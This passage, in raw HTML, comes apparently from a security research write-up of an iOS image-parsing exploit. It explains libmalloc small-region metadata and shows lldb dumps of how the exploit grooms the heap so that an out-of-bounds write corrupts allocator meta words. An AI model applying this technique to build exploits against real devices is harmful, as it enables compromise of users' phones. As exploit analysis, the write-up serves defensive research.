 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;0x148000000: 0x0000000147800000 0x0000000000000000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;0x148000010: 0x000000000019c800 0x0000000000000004&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;0x148000020: 0x0000000000000001 0x0000000000000019&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;The huffman table is &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x2F28&lt;/span&gt;&lt;span&gt;&amp;nbsp;bytes, which the allocator rounds up to &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x3000&lt;/span&gt;&lt;span&gt;. And in both of those test runs, adding the allocation size to the huffman table pointer yielded a suspiciously round number. There&amp;#39;s no way that&amp;#39;s a coincidence. Running a few more tests the &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;table+0x3000&lt;/span&gt;&lt;span&gt;&amp;nbsp;pointer is always 8MB aligned. I remembered from some presentations on the iOS userspace allocator I&amp;#39;d read that 8MB is a meaningful number. Here&amp;#39;s &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf&quot;&gt;one from Synaktiv&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgTLmTlzJ81OUix0D0YbwLxJHqxvWz9FoODHNMMlc2YXu7zIsXlnDlN3rLeYeZS89uMuNXWVyT21f6WweYNhi7T9rjYNI48bdaMdwu99QNv5W04XPk2zciSMmvnPr5WeixDG9UqD5feWIVoP8nx9Sq4_CJeASquS0cD3gvJvT992qTLTh7Ggp7CjaVC41k/s1999/image13.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgTLmTlzJ81OUix0D0YbwLxJHqxvWz9FoODHNMMlc2YXu7zIsXlnDlN3rLeYeZS89uMuNXWVyT21f6WweYNhi7T9rjYNI48bdaMdwu99QNv5W04XPk2zciSMmvnPr5WeixDG9UqD5feWIVoP8nx9Sq4_CJeASquS0cD3gvJvT992qTLTh7Ggp7CjaVC41k/s1200/image13.png&quot; border=&quot;0&quot; alt=&quot;Presentation slide from SynAckTiv explaining scalable zone memory allocation using Tiny, Small, and Large racks&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;Presentation slide from SynAckTiv explaining scalable zone memory allocation using Tiny, Small, and Large racks&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;Or &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://www.slideshare.net/AngelBoy1/macos-memory-allocator-libmalloc-exploitation%2352&quot;&gt;this one from Angelboy&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi93g-2hZd6CFI7vQ8H7FcV3FCyUlIQJ94eWD85k_8UmrLJHqjLF4tWkKjzQmQA2g3LdKts1IY9zovIt0c1Fhc40ZkqbMTmdV7IwHkkKK0AkVpzTML52EstSqcu4SLB9RcAoDl15qgGLucFzYpVjlM8v1LgoChwrrfiDBA6nxGgDgOy-S5nNpuKrSb46ak/s1670/image5.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi93g-2hZd6CFI7vQ8H7FcV3FCyUlIQJ94eWD85k_8UmrLJHqjLF4tWkKjzQmQA2g3LdKts1IY9zovIt0c1Fhc40ZkqbMTmdV7IwHkkKK0AkVpzTML52EstSqcu4SLB9RcAoDl15qgGLucFzYpVjlM8v1LgoChwrrfiDBA6nxGgDgOy-S5nNpuKrSb46ak/s1200/image5.png&quot; border=&quot;0&quot; alt=&quot;Slide from Angelboy explaining the &amp;#39;Small&amp;#39; memory region in libmalloc, noting its size of 0x800000 and 16319 blocks, and showing a diagram of its memory layout and linked list structure.&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;Slide from Angelboy explaining the &amp;#39;Small&amp;#39; memory region in libmalloc, noting its size of 0x800000 and 16319 blocks, and showing a diagram of its memory layout and linked list structure.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;8MB is the size of the iOS userspace default allocator&amp;#39;s small rack regions. It looks like they might be trying to groom the allocator not to target application-specific data but allocator metadata. Time to dive into some libmalloc internals!&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;XQFzMDWmii-c12&quot; id=&quot;h.ghgbtq9u1wm2&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c18&quot;&gt;libmalloc&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;I&amp;#39;d suggest reading the two presentations linked above for a good overview of the iOS default userspace malloc implementation&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;. Libmalloc manages memory on four levels of abstraction. From largest to smallest those are: rack, magazine, region and block. The size split between the tiny, small and large racks depends on the platform. Almost all the relevant allocations for this exploit come from the small rack, so that&amp;#39;s the one I&amp;#39;ll focus on.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;Reading through the libmalloc source I noticed that the region trailer, whilst still called a trailer, has been now moved to the start of the region object. The small region manages memory in chunks of 8MB. That 8MB gets split up in to (for our purposes) three relevant parts: a header, an array of metadata words, then blocks of 512 bytes which form the allocations:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgCMp-bRPTYK_XPZAy21JujY_GaDKo20e3Jov0_Z4CD8xpL7AZpmYoH6BgC-m4bamxMvpIxz-mXXnKarp-HelkUvP_BSxEfrYGtI2ABj8x9k_C_X7sMG-H0kMXuWiGI7azIvlzyb7v4l3MnyE071j5pfoTktL0c4wg7L3ODkaZecnY29TdOPoDwAdE1T_A/s899/image2.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgCMp-bRPTYK_XPZAy21JujY_GaDKo20e3Jov0_Z4CD8xpL7AZpmYoH6BgC-m4bamxMvpIxz-mXXnKarp-HelkUvP_BSxEfrYGtI2ABj8x9k_C_X7sMG-H0kMXuWiGI7azIvlzyb7v4l3MnyE071j5pfoTktL0c4wg7L3ODkaZecnY29TdOPoDwAdE1T_A/s899/image2.png&quot; border=&quot;0&quot; alt=&quot;Diagram showing a memory layout with a small pink block on the left labeled with &amp;#39;free flag bit&amp;#39; and &amp;#39;15 count bits&amp;#39;, and dimensions &amp;#39;0x28 bytes&amp;#39;. Below it is a larger white block labeled &amp;#39;512 bytes&amp;#39;. On the right is a larger structure composed of three stacked blocks, colored green, red, and blue, with the entire structure labeled &amp;#39;0x8200 bytes&amp;#39; and &amp;#39;8MB&amp;#39;.&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;Diagram showing a memory layout with a small pink block on the left labeled with &amp;#39;free flag bit&amp;#39; and &amp;#39;15 count bits&amp;#39;, and dimensions &amp;#39;0x28 bytes&amp;#39;. Below it is a larger white block labeled &amp;#39;512 bytes&amp;#39;. On the right is a larger structure composed of three stacked blocks, colored green, red, and blue, with the entire structure labeled &amp;#39;0x8200 bytes&amp;#39; and &amp;#39;8MB&amp;#39;.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;The first 0x28 bytes are a header where the first two fields form a linked-list of small regions:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;typedef&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;region_trailer&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;region_trailer&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;*prev;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;region_trailer&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;*next;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;unsigned&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;bytes_used;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;unsigned&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;objects_in_use;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;mag_index_t&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;mag_index;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;volatile&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;int32_t&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;pinned_to_depot;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;bool&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;recirc_suitable;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;rack_dispose_flags_t&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;dispose_flags;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;region_trailer_t;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;The small region manages memory in units of 512 bytes called blocks. On iOS allocations from the small region consist of contiguous runs of up to 31 blocks. Each block has an associated 16-bit metadata word called a small meta word, which itself is subdivided into a &amp;quot;free&amp;quot; flag in the most-significant bit, and a 15-bit count.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;To mark a contiguous run of blocks as in-use (belonging to an allocation) the first meta word has its free flags cleared and the count set to the number of blocks in the run. On &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;free&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;an allocation is first placed on a lookaside list for rapid reuse without freeing. But once an allocation really gets freed the allocator will attempt to greedily coalesce neighbouring chunks. While in-use runs can never exceed 31 blocks, free runs can grow to encompass the entire region.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;XQFzMDWmii-c12&quot; id=&quot;h.r67dy0s0nxnn&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c18&quot;&gt;The groom&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;Below you can see the state of the meta words array for the small region directly following the one containing the huffman table as its last allocation: &lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c11&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;(lldb) x/200wh 0x148000028&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c11&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x148000028: &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9 XQFzMDWmii-c15&quot;&gt;0x0019&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9 XQFzMDWmii-c15&quot;&gt;&amp;nbsp;0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c11&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x148000038: &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9 XQFzMDWmii-c15&quot;&gt;0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c11&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x148000048: &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9 XQFzMDWmii-c15&quot;&gt;0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c11&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x148000058: &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9 XQFzMDWmii-c15&quot;&gt;0x0000&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9 XQFzMDWmii-c19&quot;&gt;0x0003 0x0000 0x0000&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9 XQFzMDWmii-c32&quot;&gt;0x0018 0x0000 0x0000 0x0000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c11&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x148000068: &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9 XQFzMDWmii-c32&quot;&gt;0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c11&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x148000078: &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9 XQFzMDWmii-c32&quot;&gt;0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c11&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x148000088: &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9 XQFzMDWmii-c32&quot;&gt;0x0000 0x0000 0x0000 0x0000&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9 XQFzMDWmii-c33&quot;&gt;0x0003 0x0000 0x0000&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9 XQFzMDWmii-c14&quot;&gt;0x001c&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c11&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x148000098: &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9 XQFzMDWmii-c14&quot;&gt;0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c11&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x1480000a8: &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9 XQFzMDWmii-c14&quot;&gt;0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c11&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x1480000b8: &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9 XQFzMDWmii-c14&quot;&gt;0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c11&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x1480000c8: &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9 XQFzMDWmii-c14&quot;&gt;0x0000 0x0000 0x0000&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9 XQFzMDWmii-c31&quot;&gt;0x001d 0x0000 0x0000 0x0000 0x0000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;With some simple maths we can convert indexes in the meta words array into their corresponding heap pointers. Doing that it&amp;#39;s possible to dump the memory associated with the allocations shown above. The larger &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9 XQFzMDWmii-c15&quot;&gt;0x19&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9 XQFzMDWmii-c32&quot;&gt;0x18&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9 XQFzMDWmii-c14&quot;&gt;0x1c&lt;/span&gt;&lt;span&gt;&amp;nbsp;allocations all seem to be generic groom allocations, but the two &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x3&lt;/span&gt;&lt;span&gt;&amp;nbsp;block allocations appear more interesting. The first one (with the first metadata word at &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x14800005a&lt;/span&gt;&lt;span&gt;, shown in yellow) is the &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;code_lengths&lt;/span&gt;&lt;span&gt;&amp;nbsp;array which gets freed directly after the huffman table building fails. The blue &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x3&lt;/span&gt;&lt;span&gt;&amp;nbsp;block run (with the first metadata word at &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x148000090&lt;/span&gt;&lt;span&gt;) is the backing buffer for a &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;CFSet&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;object from the MakerNote and contains object pointers.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;Recall that the corruption primitive will write the dword &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x270007&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x58&lt;/span&gt;&lt;span&gt;&amp;nbsp;bytes off the end of the &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x3000&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;allocation (and that allocation happens to sit directly in front of this small region). That corruption has the following effect (shown in bold):&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c11&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;(lldb) x/200wh 0x148000028&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c11&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x148000028: &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9 XQFzMDWmii-c15&quot;&gt;0x0019 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c11&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x148000038: &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9 XQFzMDWmii-c15&quot;&gt;0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000&lt;/span&gt;&lt;/p&gt;
